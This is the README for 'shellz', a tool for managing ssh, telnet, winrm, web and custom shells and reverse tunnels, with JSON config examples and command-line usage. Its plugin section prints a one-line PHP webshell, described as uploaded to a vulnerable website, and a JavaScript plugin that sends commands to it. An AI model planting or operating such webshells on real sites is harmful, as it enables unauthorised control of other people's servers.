<p align="center">
  <img alt="shellz" src="https://raw.githubusercontent.com/evilsocket/shellz/master/logo.png" />
  <p align="center">
    <a href="https://github.com/evilsocket/shellz/releases/latest"><img alt="Release" src="https://img.shields.io/github/release/evilsocket/shellz.svg?style=flat-square"></a>
    <a href="https://github.com/evilsocket/shellz/blob/master/LICENSE.md"><img alt="Software License" src="https://img.shields.io/badge/license-GPL3-brightgreen.svg?style=flat-square"></a>
    <a href="https://travis-ci.org/evilsocket/shellz"><img alt="Travis" src="https://img.shields.io/travis/evilsocket/shellz/master.svg?style=flat-square"></a>
    <a href="https://goreportcard.com/report/github.com/evilsocket/shellz"><img alt="Go Report Card" src="https://goreportcard.com/badge/github.com/evilsocket/shellz?style=flat-square&fuckgithubcache=1"></a>
  </p>
</p>

`shellz` is a small utility to track and control your ssh, telnet, winrm, web and custom shells and tunnels ([demo](https://www.youtube.com/watch?v=ZjMRbUhw9z4)).

## Installation

A [precompiled version is available for each release](https://github.com/evilsocket/shellz/releases), alternatively you can use the latest version of the source code from this repository in order to build your own binary.

### From Sources

Make sure you have a correctly configured **Go >= 1.8** environment, that `$GOPATH/bin` is in `$PATH` and then:

    $ go get -u github.com/toomanybananas/shellz/cmd/shellz

This command will download shellz, install its dependencies, compile it and move the `shellz` executable to `$GOPATH/bin`.

## How to Use

The tool will use the `~/.shellz` folder to load your identities and shells json files, running the command `shellz` the first time will create the folder and the `idents` and `shells` subfolders for you. Once both `~/.shellz/idents` and `~/.shellz/shells` folders have been created, you can start by creating your first identity json file, for instance let's create `~/.shellz/idents/default.json` with the following contents:

```json
{
    "name": "default",
    "username": "evilsocket",
    "key": "~/.ssh/id_rsa"
}
```

As you can see my `default` identity is using my SSH private key to log in the `evilsocket` user, alternatively you can specify a `"password"` field instead of a `"key"`. Alternatively, you can set the `"key"` field to `"@agent"`, in which case shellz will ask the ssh-agent for authentication details to the remote host:

```json
{
    "name": "default",
    "username": "evilsocket",
    "key": "@agent"
}
```

Now let's create our first shell json file ( `~/.shellz/shells/media.json` ) that will use the `default` identity we just created to connect to our home media server (called `media.server` in our example):

```json
{
    "name": "media-server",
    "host": "media.server",
    "groups": ["servers", "media", "whatever"],
    "port": 22,
    "identity": "default"
}
```

Shells can (optionally) be grouped (with a default `all` group containing all of them) and, by default, they are considered `ssh`, in which case you can also specify the ciphers your server supports:


```json
{
    "name": "old-server",
    "host": "old.server",
    "groups": ["servers", "legacy"],
    "port": 22,
    "identity": "default",
    "ciphers": ["aes128-cbc", "3des-cbc"]
}
```

If you wish to use a SOCKS5 proxy (supported for the `ssh` session and custom shells), for instance to reach a shell on a TOR hidden service, you can use the `"proxy"` configuration object:

```json
{
  "name": "my-tor-shell",
  "host": "whateverwhateveroihfdwoeghfd.onion",
  "port": 22,
  "identity": "default",
  "proxy": {
    "address": "127.0.0.1",
    "port": 9050,
    "username": "this is an optional field",
    "password": "this is an optional field"
  }
}
```

Also the `telnet` and `winrm` protocols are supported:

```sh
cat ~/.shellz/shells/tnas.json
```

```json
{
    "name": "tnas",
    "host": "tnas.local",
    "port": 23,
    "identity": "admin-tnas",
    "type": "telnet"
}
```

```sh
cat ~/.shellz/shells/win.json
```

```json
{
    "name": "win10",
    "host": "win10.local",
    "port": 5986,
    "identity": "admin-win10",
    "type": "winrm",
    "https": true,
    "insecure": false
}
```

### Reverse Tunnels

`shellz` can be used for starting reverse SSH tunnels, for instance, let's create the `~/.shellz/shells/mytunnel.json` file:

```json
{
    "name": "my.tunnel",
    "host": "example.com",
    "tunnel": {
        "local": {
            "address": "127.0.0.1",
            "port": 8443
        },
        "remote": {
            "address": "192.168.1.1",
            "port": 443
        }
    }
}
```

By running the following command:

    shellz -tunnel -on my.tunnel

The remote endpoint `https://192.168.1.1` will be tunneled by `example.com` and available on your computer at `https://localhost:8443`.

### Plugins

Instead of the two default types, `ssh` and `telnet`, you can specify a custom name, in which case shellz will try to use a user plugin. Let's start by creating a new shell json file `~/.shellz/shells/custom.json` with the following contents:

```json
{
    "name": "custom",
    "host": "http://www.imvulnerable.gov/uploads/sh.php",
    "identity": "empty",
    "port": 80,
    "type": "mycustomshell"
}
```

As you probably noticed, the `host` field is the full URL of a very simple PHP webshell uploaded on some website:

```php
<?php system($_REQUEST["cmd"]); die; ?>
```

Also, the `type` field is set to `mycustomshell`, in this case `shellz` will try to load the file `~/.shellz/plugins/mycustomshell.js` and use it to create a session and execute a command. 

A `shellz` plugin must export the `Create`, `Exec` and `Close` functions, this is how `mycustomshell.js` looks like:

```js
var headers = {
    'User-Agent': 'imma-shellz-plugin'
};

/*
 * The Create callback is called whenever a new command has been queued
 * for execution and the session should be initiated, in this case we 
 * simply return the main shell object, but it might be used to connect
 * to the endpoint and store the socket on a more complex Object.
 */
function Create(sh) {
    log.Debug("Create(" + sh + ")");
    return sh;
}

/*
 * Exec is called for each command, the first argument is the object
 * returned from the Create callback, while the second is a string with the
 * command itself.
 */
function Exec(sh, cmd) {
    log.Debug("running " + cmd + " on " + sh.Host);
    /* 
     * OR
     *
     * var resp = http.Post(sh.Host, headers, {"cmd":cmd});
     */
    var resp = http.Get(sh.Host + "?cmd=" + cmd, headers)
    if( resp.Error ) {
        log.Error("error while running " + cmd + ": " + resp.Error);
        return resp.Error;
    }
    return resp.Raw;
}

/*
 * Used to finalize the state of the object (close sockets, etc).
 */
function Close(sh) {
    log.Debug("Close(" + sh + ")");
}
```

To use a SOCKS5 proxy with the `http` object:

```js
var proxied = http.WithProxy("127.0.0.1", 9050, "optional username", "optional password");

proxied.Get(...);
```

Other than the `log` interface and the `http` client, also a `tcp` client is available with the following API:

```js
// this will create the client
var c = tcp.Connect("1.2.3.4:80");
if( c == null ) {
    log.Error("could not connect!");
    return;
}

// send some bytes
c.Write("somebyteshere");

// read some bytes until a newline
var ret = c.ReadUntil("\n");
if( ret.Error != null ) {
    log.Error("error while reading: " + err);
} else {
    // print results
    log.Info("res=" + ret.Raw);
}

// always close the socket
c.Close();
```

### Examples

List available identities, plugins and shells:

    shellz -list

List all available identities and shells of the group web:

    shellz -list -on web

Enable the shells named machineA and machineB:

    shellz -enable machineA, machineB

Enable shells of the group `web`:

    shellz -enable web

Disable the shell named machineA (commands won't be executed on it):

    shellz -disable machineA

Test all shells and disable the not responding ones:

    shellz -test

Test two shells and disable them if they don't respond within 1 second:

    shellz -test -on "machineA, machineB" -connection-timeout 1s

Run the command `id` on each shell ( with `-to` default to `all`):

    shellz -run id

Run the command 'id' on each shell and print some statistics once finished:

    shellz -run id -stats

Run the command `id` on a single shell named `machineA`:

    shellz -run id -on machineA

Run the command `id` on `machineA` and `machineB`:

    shellz -run id -on 'machineA, machineB'

Run the command `id` on shells of group `web`:

    shellz -run id -on web

Run the command `uptime` on every shell and append all outputs to the `all.txt` file:

    shellz -run uptime -to all.txt

Run the command `uptime` on every shell and save each outputs to a different file using per-shell data (every field referenced between `{{` and `}}` will be replaced by the json field of the shell object):

    shellz -run uptime -to "{{.Identity.Username}}_{{.Name}}.txt"

Start a ssh reverse tunnel:

    shellz -tunnel -on some-tunnel

For a list of all available flags and some usage examples just type `shellz` without arguments.

## License

Shellz was made with ♥  by [Simone Margaritelli](https://www.evilsocket.net/) and it's released under the GPL 3 license.
